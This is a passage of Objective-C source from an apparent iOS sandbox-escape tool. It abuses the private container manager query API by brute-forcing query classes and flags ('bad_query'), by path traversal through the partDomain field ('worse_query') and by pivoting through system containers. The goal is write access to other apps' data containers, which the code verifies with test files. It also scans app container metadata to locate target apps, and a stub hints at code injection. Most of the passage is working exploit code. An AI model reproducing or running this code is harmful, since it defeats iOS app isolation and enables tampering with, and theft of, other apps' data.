                        if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                            result.method = 7; result.handle = h; result.writeOK = YES;
                            snprintf(result.detail, sizeof(result.detail),
                                     "MCM flags=0x%llx part=%llu VERIFIED h=%lld",
                                     kFlagSets[fi], (unsigned long long)part, (long long)h);
                            _probeDiagAppend("*** SUCCESS S1.6 ***");
                            free(token); _storeLease(api, q, NULL, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (h >= 0 && releaseExt) releaseExt(h);
                    }
                    free(token);
                }
                xpc_release(xid);
                api->queryFree(q);
            }
        }
    }

    // ── Strategy 1.7: MCM class-7 app group query → activate → open target container ──
    if (api->queryCreate && api->querySetGroupIdentifiers) {
        _probeDiagAppend("S1.7:C7 | ");
        for (int g = 0; g < kAppGroupCount; g++) {
            static const uint64_t kC7Flags[] = { 0x900000000ULL, 0x8100000000ULL };
            for (int fi = 0; fi < 2; fi++) {
                void *q = api->queryCreate();
                if (!q) continue;
                api->querySetClass(q, 7);
                xpc_object_t xid = xpc_string_create(kAppGroups[g]);
                api->querySetGroupIdentifiers(q, xid);
                api->querySetFlags(q, kC7Flags[fi]);
                if (api->querySetPart) api->querySetPart(q, 0);

                void *res = api->queryGetSingle(q);
                if (res && api->objectCopy && api->objectActivate) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, false);
                        _probeDiagAppend("C7[%d]f%d=%d ", g, fi, ok);
                        if (ok && _mcmProbeCanWrite(pathC)) {
                            result.method = 8; result.handle = 0; result.writeOK = YES;
                            snprintf(result.detail, sizeof(result.detail),
                                     "MCM C7 group[%d] flags=0x%llx VERIFIED", g, kC7Flags[fi]);
                            _probeDiagAppend("*** SUCCESS S1.7 ***");
                            _storeLease(api, q, act, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                xpc_release(xid);
                api->queryFree(q);
            }
        }
    }

    // ── Strategy SYS: Basic system container query (no partDomain) — verify MCM trust ──
    {
        _probeDiagAppend("SSYS | ");
        static const struct { uint64_t cls; const char *id; bool grp; const char *lbl; } sysQ[] = {
            { 12, "com.apple.geod", false, "C12" },
            { 13, "systemgroup.com.apple.mobilegestaltcache", true, "C13" },
        };
        for (int si = 0; si < 2; si++) {
            if (!api->queryCreate) continue;
            void *sq = api->queryCreate();
            if (!sq) continue;
            api->querySetClass(sq, sysQ[si].cls);
            xpc_object_t sxid = xpc_string_create(sysQ[si].id);
            if (sysQ[si].grp && api->querySetGroupIdentifiers)
                api->querySetGroupIdentifiers(sq, sxid);
            else
                api->querySetIdentifiers(sq, sxid);
            api->querySetFlags(sq, 0x900000000ULL);
            if (api->querySetPart) api->querySetPart(sq, 0);
            void *sres = api->queryGetSingle(sq);
            if (sres) {
                const char *sp = api->objectGetPath ? api->objectGetPath(sres) : NULL;
                char *stok = api->objectCopyToken ? api->objectCopyToken(sres) : NULL;
                bool sHasTok = stok && stok[0];
                _probeDiagAppend("%s:p=%d t=%d ", sysQ[si].lbl, sp ? 1 : 0, sHasTok);
                if (api->objectCopy && api->objectActivate) {
                    void *sact = api->objectCopy(sres);
                    if (sact) {
                        bool sok = api->objectActivate(sact, false);
                        _probeDiagAppend("a=%d ", sok);
                        if (sp) {
                            int sfd = open(sp, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                            _probeDiagAppend("o=%d ", sfd >= 0 ? 1 : 0);
                            if (sfd >= 0) close(sfd);
                            // Write test: try creating a temp file in this container
                            char wtest[1024];
                            snprintf(wtest, sizeof(wtest), "%s/.davizin_wtest", sp);
                            int wfd = open(wtest, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
                            _probeDiagAppend("w=%d ", wfd >= 0 ? 1 : 0);
                            if (wfd >= 0) { close(wfd); unlink(wtest); }
                            // After activating system container, test if target app container opens
                            int tfd = open(pathC, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                            _probeDiagAppend("tgt=%d ", tfd >= 0 ? 1 : 0);
                            if (tfd >= 0) {
                                close(tfd);
                                if (_mcmProbeCanWrite(pathC)) {
                                    result.method = 8; result.handle = 0; result.writeOK = YES;
                                    snprintf(result.detail, sizeof(result.detail),
                                             "SSYS %s pivot → target WRITE OK", sysQ[si].lbl);
                                    _probeDiagAppend("*** SUCCESS SSYS-pivot ***");
                                    _storeLease(api, sq, sact, sysQ[si].id, sp);
                                    free(stok);
                                    xpc_release(sxid);
                                    return result;
                                }
                            }
                        }
                        if (api->objectFree) api->objectFree(sact);
                    }
                }
                free(stok);
            } else {
                void *sqErr = api->queryGetLastError ? api->queryGetLastError(sq) : NULL;
                int spos = sqErr && api->errorGetPOSIX ? api->errorGetPOSIX(sqErr) : 0;
                _probeDiagAppend("%s:null(e%d) ", sysQ[si].lbl, spos);
            }
            xpc_release(sxid);
            api->queryFree(sq);
        }
    }

    // ── Strategy WQ: worse_query — scoped MCM partDomain traversal ──
    {
        _probeDiagAppend("SWQ:wq | ");
        const char *relPath = NULL;
        if (strncmp(pathC, "/private/var/", 13) == 0)
            relPath = pathC + 13;
        else if (strncmp(pathC, "/var/", 5) == 0)
            relPath = pathC + 5;

        if (relPath && api->queryCreate && api->querySetPartDomain && api->objectCopy && api->objectActivate) {
            for (int i = 0; i < kWQAnchorCount; i++) {
                const WQAnchor *a = &kWQAnchors[i];

                char domain[2048];
                domain[0] = '\0';
                for (int d = 0; d < a->depth; d++) {
                    if (d == 0) strlcat(domain, "..", sizeof(domain));
                    else strlcat(domain, "/..", sizeof(domain));
                }
                strlcat(domain, "/", sizeof(domain));
                strlcat(domain, relPath, sizeof(domain));

                void *q = api->queryCreate();
                if (!q) continue;

                api->querySetClass(q, a->cls);
                xpc_object_t xid = xpc_string_create(a->identifier);
                if (a->group && api->querySetGroupIdentifiers)
                    api->querySetGroupIdentifiers(q, xid);
                else
                    api->querySetIdentifiers(q, xid);
                api->querySetFlags(q, kMCMReadWritePartFlags);
                if (api->querySetPart) api->querySetPart(q, a->part);
                api->querySetPartDomain(q, domain);

                void *res = api->queryGetSingle(q);
                if (res) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                        bool hasToken = token && token[0] != '\0';
                        bool activated = hasToken && api->objectActivate(act, false);
                        free(token);
                        _probeDiagAppend("WQ[%s]t=%d a=%d ", a->label, hasToken, activated);

                        if (_mcmProbeCanWrite(pathC)) {
                            result.method = 20 + i; result.handle = 0; result.writeOK = YES;
                            snprintf(result.detail, sizeof(result.detail),
                                     "worse_query %s WRITE VERIFIED", a->label);
                            _probeDiagAppend("*** SUCCESS WQ ***");
                            _storeLease(api, q, act, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }

                        int fd = open(pathC, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                        if (fd >= 0) {
                            close(fd);
                            _probeDiagAppend("WQ[%s]read_ok ", a->label);
                        }

                        if (api->objectFree) api->objectFree(act);
                    }
                } else {
                    void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
                    int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
                    _probeDiagAppend("WQ[%s]=null(e%d) ", a->label, posix);
                }

                xpc_release(xid);
                api->queryFree(q);
            }
        }
    }

    // ── Strategy WQ-parent: worse_query on parent directory ──
    {
        const char *parentDir = "/private/var/mobile/Containers/Data/Application";
        const char *parentRel = "mobile/Containers/Data/Application";
        _probeDiagAppend("SWQp | ");

        if (api->queryCreate && api->querySetPartDomain && api->objectCopy && api->objectActivate) {
            for (int i = 0; i < kWQAnchorCount && i < 4; i++) {
                const WQAnchor *a = &kWQAnchors[i];

                char domain[2048];
                domain[0] = '\0';
                for (int d = 0; d < a->depth; d++) {
                    if (d == 0) strlcat(domain, "..", sizeof(domain));
                    else strlcat(domain, "/..", sizeof(domain));
                }
                strlcat(domain, "/", sizeof(domain));
                strlcat(domain, parentRel, sizeof(domain));

                void *q = api->queryCreate();
                if (!q) continue;

                api->querySetClass(q, a->cls);
                xpc_object_t xid = xpc_string_create(a->identifier);
                if (a->group && api->querySetGroupIdentifiers)
                    api->querySetGroupIdentifiers(q, xid);
                else
                    api->querySetIdentifiers(q, xid);
                api->querySetFlags(q, kMCMReadWritePartFlags);
                if (api->querySetPart) api->querySetPart(q, a->part);
                api->querySetPartDomain(q, domain);

                void *res = api->queryGetSingle(q);
                if (res) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                        bool hasToken = token && token[0] != '\0';
                        bool activated = hasToken && api->objectActivate(act, false);
                        free(token);
                        _probeDiagAppend("WQp[%s]t=%d a=%d ", a->label, hasToken, activated);

                        if (_mcmProbeCanWrite(pathC)) {
                            result.method = 30 + i; result.handle = 0; result.writeOK = YES;
                            snprintf(result.detail, sizeof(result.detail),
                                     "worse_query parent %s WRITE VERIFIED", a->label);
                            _probeDiagAppend("*** SUCCESS WQp ***");
                            _storeLease(api, q, act, "wq-parent", parentDir);
                            xpc_release(xid);
                            return result;
                        }

                        if (api->objectFree) api->objectFree(act);
                    }
                } else {
                    void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
                    int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
                    _probeDiagAppend("WQp[%s]=null(e%d) ", a->label, posix);
                }

                xpc_release(xid);
                api->queryFree(q);
            }
        }
    }

    // ── Strategy 2: bad_query_probe_write (multi-class/flags brute force) ──
    _probeDiagAppend("S2:bq | ");
    {
        BQProbeResult bq = bad_query_probe_write(pathC, bidC);
        _probeDiagAppend("bq:m=%d ok=%d ", bq.method, bq.write_ok);
        if (bq.write_ok) {
            result.method = bq.method + 10;
            result.handle = bq.handle;
            result.writeOK = YES;
            snprintf(result.detail, sizeof(result.detail), "bad_query: %s", bq.detail);
            _probeDiagAppend("*** SUCCESS S2 ***");
            return result;
        }
    }

    // ── Strategy 3: Direct open() with various flags (Hail Mary) ──
    {
        char testFile[1200];
        snprintf(testFile, sizeof(testFile), "%s/.hail_mary_test", pathC);

        // Try open with O_NOFOLLOW and O_SYMLINK variants
        int flags[] = {
            O_WRONLY | O_CREAT | O_TRUNC,
            O_RDWR | O_CREAT | O_TRUNC,
            O_WRONLY | O_CREAT,
        };
        for (int i = 0; i < 3; i++) {
            int fd = open(testFile, flags[i], 0666);
            if (fd >= 0) {
                write(fd, "hailmary", 8);
                close(fd);
                FILE *vf = fopen(testFile, "r");
                if (vf) {
                    char buf[16] = {0};
                    fread(buf, 1, 8, vf);
                    fclose(vf);
                    unlink(testFile);
                    if (strcmp(buf, "hailmary") == 0) {
                        result.method = 50 + i;
                        result.handle = 0;
                        result.writeOK = YES;
                        snprintf(result.detail, sizeof(result.detail),
                                 "direct open(flags=0x%x) VERIFIED", flags[i]);
                        _probeDiagAppend("*** SUCCESS S3 flags=%d ***", flags[i]);
                        return result;
                    }
                }
                unlink(testFile);
            }
        }
        _probeDiagAppend("S3:fail ");
    }

    // ── Post-diagnostic: sandbox_check after all attempts ──
    if (sbCheck) {
        int canW = sbCheck(getpid(), "file-write-data", SANDBOX_FILTER_PATH, pathC);
        _probeDiagAppend("sb_after: w=%d", canW);
    }

    strlcpy(result.detail, "all probe strategies exhausted", sizeof(result.detail));
    _probeDiagAppend(" | EXHAUSTED");
    DavizinMCMLog(@"[Probe] ALL STRATEGIES FAILED");
    return result;
}

void DavizinProbeRelease(DavizinProbeResult *res) {
    if (!res || res->handle <= 0) return;
    SandboxExtReleaseFunc releaseExt = (SandboxExtReleaseFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (releaseExt) releaseExt(res->handle);
    res->handle = -1;
}

#pragma mark - MCM native enumeration (Filza technique)

static NSString *_mcmQueryContainerPath(uint64_t containerClass, NSString *identifier,
                                        BOOL group, uint64_t flags) {
    MCMAPI *api = MCMGetAPI();
    if (!api->queryCreate || !api->queryGetSingle || !api->objectGetPath) return nil;

    void *q = api->queryCreate();
    if (!q) return nil;

    api->querySetClass(q, containerClass);
    xpc_object_t xid = xpc_string_create(identifier.UTF8String);
    if (group && api->querySetGroupIdentifiers)
        api->querySetGroupIdentifiers(q, xid);
    else
        api->querySetIdentifiers(q, xid);
    api->querySetFlags(q, flags);
    if (api->querySetPart) api->querySetPart(q, 0);

    void *res = api->queryGetSingle(q);
    NSString *path = nil;
    if (res) {
        const char *raw = api->objectGetPath(res);
        if (raw) path = [NSString stringWithUTF8String:raw];
        if (path && ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]))
            path = [@"/private" stringByAppendingString:path];

        // Try to activate sandbox extension (may fail on iOS 26+ but path is still valid)
        if (api->objectCopy && api->objectActivate) {
            void *act = api->objectCopy(res);
            if (act) {
                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                bool activated = false;
                if (token && token[0] != '\0')
                    activated = api->objectActivate(act, false);
                free(token);
                if (activated) {
                    _storeLease(api, q, act, identifier.UTF8String, path.UTF8String);
                    DavizinMCMLog([NSString stringWithFormat:
                        @"[MCMQuery] class=%llu id=%@ activated OK: %@", containerClass, identifier, path]);
                    xpc_release(xid);
                    return path;
                }
                if (api->objectFree) api->objectFree(act);
            }
        }

        // iOS 26 workaround: path may be accessible even without sandbox token
        if (path.length > 0) {
            int fd = open(path.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
            if (fd >= 0) {
                close(fd);
                DavizinMCMLog([NSString stringWithFormat:
                    @"[MCMQuery] class=%llu id=%@ no token but open() OK: %@", containerClass, identifier, path]);
                api->queryFree(q);
                xpc_release(xid);
                return path;
            }
        }
    }

    api->queryFree(q);
    xpc_release(xid);
    return path;
}

static NSArray<NSString *> *_mcmEnumerateIdentifiers(uint64_t containerClass, NSUInteger limit) {
    MCMAPI *api = MCMGetAPI();
    if (!api->queryCreate || !api->queryIterate || !api->objectGetIdentifier || limit == 0)
        return @[];

    void *q = api->queryCreate();
    if (!q) return @[];

    api->querySetClass(q, containerClass);
    api->querySetFlags(q, 0x100000000ULL);
    if (api->querySetPart) api->querySetPart(q, 0);

    NSMutableOrderedSet<NSString *> *identifiers = [NSMutableOrderedSet orderedSet];
    api->queryIterate(q, ^bool(void *object) {
        const char *raw = object ? api->objectGetIdentifier(object) : NULL;
        NSString *identifier = raw ? [NSString stringWithUTF8String:raw] : nil;
        if (identifier.length) [identifiers addObject:identifier];
        return identifiers.count < limit;
    });

    api->queryFree(q);
    DavizinMCMLog([NSString stringWithFormat:
        @"[MCMEnum] class=%llu found %lu identifiers", containerClass, (unsigned long)identifiers.count]);
    return identifiers.array;
}

#pragma mark - Container discovery via MCM enum + bad_query + filesystem (iOS 27+)

static int64_t _tryGetSandboxAccess(const char *targetPath) {
    // Class 13 (system group) — fast, might work on some iOS 27 builds
    int64_t h = bad_query((char *)targetPath, true, NULL, false);
    if (h >= 0) return h;

    // Class 7 (app group) — XO Files approach, proven on iOS 27.2
    for (int g = 0; g < kAppGroupCount; g++) {
        h = bad_query((char *)targetPath, true, (char *)kAppGroups[g], false);
        if (h >= 0) return h;
        h = bad_query((char *)targetPath, false, (char *)kAppGroups[g], false);
        if (h >= 0) return h;
    }

    return -1;
}

static NSString *_scanContainerDir(const char *basePath, NSString *targetBundleID) {
    DIR *dir = opendir(basePath);
    if (!dir) return nil;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR && entry->d_type != DT_UNKNOWN) continue;
        if (entry->d_name[0] == '.') continue;
        if (strlen(entry->d_name) < 32) continue;

        char metaPath[1200];
        snprintf(metaPath, sizeof(metaPath),
                 "%s/%s/.com.apple.mobile_container_manager.metadata.plist",
                 basePath, entry->d_name);

        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:
            [NSString stringWithUTF8String:metaPath]];
        if (!plist) continue;

        NSString *identifier = plist[@"MCMMetadataIdentifier"];
        if ([identifier isEqualToString:targetBundleID]) {
            closedir(dir);
            char fullPath[1200];
            snprintf(fullPath, sizeof(fullPath),
                     "/private/var/mobile/Containers/Data/Application/%s",
                     entry->d_name);
            DavizinMCMLog([NSString stringWithFormat:
                @"[Discovery] Match: %@ → %s", targetBundleID, fullPath]);
            return [NSString stringWithUTF8String:fullPath];
        }
    }
    closedir(dir);
    return nil;
}

NSString *DavizinDiscoverContainerPath(NSString *bundleID) {
    if (!bundleID || bundleID.length == 0) return nil;

    DavizinMCMLog([NSString stringWithFormat:
        @"[Discovery] Buscando container para %@", bundleID]);

    // Pass 0: MCM class-2 direct query (may fail on iOS 27.2 but try both flag sets)
    {
        static const uint64_t kFlagSets[] = { 0x900000000ULL, 0x8100000000ULL };
        for (int f = 0; f < 2; f++) {
            NSString *path = _mcmQueryContainerPath(2, bundleID, NO, kFlagSets[f]);
            if (path.length > 0 && path.isAbsolutePath) {
                DavizinMCMLog([NSString stringWithFormat:
                    @"[Discovery] MCM class-2 flags=0x%llx: %@", kFlagSets[f], path]);
                return path;
            }
        }
    }

    // Pass 0b: MCM enumeration — enumerate class-2 identifiers to find our target
    {
        NSArray<NSString *> *identifiers = _mcmEnumerateIdentifiers(2, 500);
        if ([identifiers containsObject:bundleID]) {
            DavizinMCMLog([NSString stringWithFormat:
                @"[Discovery] MCM enum confirmed %@ exists, re-querying", bundleID]);
            NSString *path = _mcmQueryContainerPath(2, bundleID, NO, 0x900000000ULL);
            if (path.length > 0) return path;
        }
    }

    static const char *kDirs[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Data/Application",
    };
    static const int kDirCount = 2;

    // Pass 0c: worse_query on parent directory to enable scanning
    {
        int64_t wqHandle = _worseQueryGrant("/private/var/mobile/Containers/Data/Application", "wq-discover");
        if (wqHandle >= 0) {
            DavizinMCMLog([NSString stringWithFormat:
                @"[Discovery] WQ parent grant OK handle=%lld", wqHandle]);
        }
    }

    // Pass 1: try without granting (AppDataContainers entitlement might suffice)
    for (int i = 0; i < kDirCount; i++) {
        NSString *found = _scanContainerDir(kDirs[i], bundleID);
        if (found) {
            DavizinMCMLog([NSString stringWithFormat:
                @"[Discovery] Encontrado sin grant: %@", found]);
            return found;
        }
    }

    // Pass 2: grant read access via bad_query, then scan
    for (int i = 0; i < kDirCount; i++) {
        int64_t handle = _tryGetSandboxAccess(kDirs[i]);
        if (handle >= 0) {
            DavizinMCMLog([NSString stringWithFormat:
                @"[Discovery] Sandbox grant handle=%lld para %s", handle, kDirs[i]]);
            NSString *found = _scanContainerDir(kDirs[i], bundleID);
            if (found) return found;
        }
    }

    DavizinMCMLog([NSString stringWithFormat:
        @"[Discovery] Container no encontrado para %@", bundleID]);
    return nil;
}

BOOL DavizinIsBundleInstalled(NSString *bundleID) {
    return DavizinDiscoverContainerPath(bundleID) != nil;
}

#pragma mark - Stubs

NSString *DavizinPrepareInjectionQuery(NSString *bundleID, NSString **outErr) {
    return nil;
}

NSString *DavizinMCMLastDiagnostic(void) {
    return @"Using direct container_query C API with persistent lease + probe";
}
